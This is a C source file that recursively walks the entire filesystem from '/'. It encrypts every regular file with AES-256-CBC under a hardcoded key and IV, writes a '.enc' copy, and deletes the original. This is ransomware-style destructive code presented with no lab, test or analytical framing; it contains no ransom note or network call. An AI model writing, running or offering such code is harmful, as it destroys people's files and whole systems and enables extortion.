#include <stdio.h>
#include <stdlib.h>
#include <dirent.h>
#include <string.h>
#include <openssl/evp.h>
#include <openssl/aes.h>
#include <sys/stat.h>

void ls_dir_encrypt(const char *start_path);
void encrypt_file(FILE *fin, FILE *fpout, unsigned char *key, unsigned char *iv);

int main()
{
  const char *start_path = "/"; // Directory to start encryption
  ls_dir_encrypt(start_path);
  return 0;
}

void ls_dir_encrypt(const char *start_path)
{
  DIR *dir;
  struct dirent *ent;
  unsigned char key[] = "12345678901234561234567890123456"; // 32 char 256bit key
  unsigned char iv[] = "1234567890123456";                  // 16 char 128 bit block size

  if ((dir = opendir(start_path)) == NULL)
  {
    perror("opendir");
    return;
  }

  while ((ent = readdir(dir)) != NULL)
  {
    struct stat st;
    size_t full_path_length = strlen(start_path) + strlen(ent->d_name) + 2;
    char *full_path = (char *)malloc(full_path_length);
    if (full_path == NULL)
    {
      perror("malloc error");
      closedir(dir);
      return;
    }
    snprintf(full_path, full_path_length, "%s/%s", start_path, ent->d_name);

    if (lstat(full_path, &st) == -1)
    {
      perror("lstat error");
      free(full_path);
      continue;
    }

    // If it's a regular file and not already encrypted
    if (S_ISREG(st.st_mode))
    {
      int len = strlen(ent->d_name);
      const char *lastfour = &ent->d_name[len - 4];

      if (strcmp(lastfour, ".enc") != 0)
      {
        size_t new_name_length = full_path_length + 4; // Adding ".enc"
        char *new_name = (char *)malloc(new_name_length + 1);
        if (new_name == NULL)
        {
          perror("malloc error for new_name");
          free(full_path);
          closedir(dir);
          return;
        }
        snprintf(new_name, new_name_length, "%s.enc", full_path);

        FILE *fpin = fopen(full_path, "rb");
        FILE *fpout = fopen(new_name, "wb");

        if (fpin == NULL || fpout == NULL)
        {
          perror("Error opening file");
          free(full_path);
          free(new_name);
          if (fpin)
            fclose(fpin);
          if (fpout)
            fclose(fpout);
          continue;
        }

        encrypt_file(fpin, fpout, key, iv);
        fclose(fpin);
        fclose(fpout);

        // Remove the original file after encryption
        if (remove(full_path) != 0)
        {
          perror("Error removing original file");
        }

        free(new_name);
      }
    }
    else if (S_ISDIR(st.st_mode))
    {
      if (strcmp(ent->d_name, ".") != 0 && strcmp(ent->d_name, "..") != 0)
      {
        size_t path_len = strlen(full_path) + 2;
        char *sub_dir = (char *)malloc(path_len);
        if (sub_dir == NULL)
        {
          perror("malloc error for sub_dir");
          free(full_path);
          closedir(dir);
          return;
        }
        snprintf(sub_dir, path_len, "%s/", full_path);

        printf("Entering directory: %s\n", sub_dir);
        ls_dir_encrypt(sub_dir); // Recursive call for subdirectories

        free(sub_dir);
      }
    }
    free(full_path);
  }

  closedir(dir);
}

void encrypt_file(FILE *fin, FILE *fpout, unsigned char *key, unsigned char *iv)
{
  const unsigned bufsize = 4096;
  unsigned char *read_buff = malloc(bufsize);
  unsigned char *cipher_buf;
  unsigned blocksize;
  int out_len;
  EVP_CIPHER_CTX *ctx = EVP_CIPHER_CTX_new();
  EVP_CipherInit(ctx, EVP_aes_256_cbc(), key, iv, 1); // 1 = Encrypt
  blocksize = EVP_CIPHER_CTX_block_size(ctx);
  cipher_buf = malloc(bufsize + blocksize);

  if (!read_buff || !cipher_buf || !ctx)
  {
    perror("Error allocating memory for encryption");
    if (read_buff)
      free(read_buff);
    if (cipher_buf)
      free(cipher_buf);
    if (ctx)
      EVP_CIPHER_CTX_free(ctx);
    return;
  }

  while (1)
  {
    int bytes_read = fread(read_buff, sizeof(unsigned char), bufsize, fin);
    if (bytes_read < 0)
    {
      perror("Error reading from input file");
      break;
    }

    EVP_CipherUpdate(ctx, cipher_buf, &out_len, read_buff, bytes_read);
    fwrite(cipher_buf, sizeof(unsigned char), out_len, fpout);

    if (bytes_read < bufsize)
    {
      break; // End of file
    }
  }

  EVP_CipherFinal(ctx, cipher_buf, &out_len);
  fwrite(cipher_buf, sizeof(unsigned char), out_len, fpout);

  free(cipher_buf);
  free(read_buff);
  EVP_CIPHER_CTX_free(ctx);
}
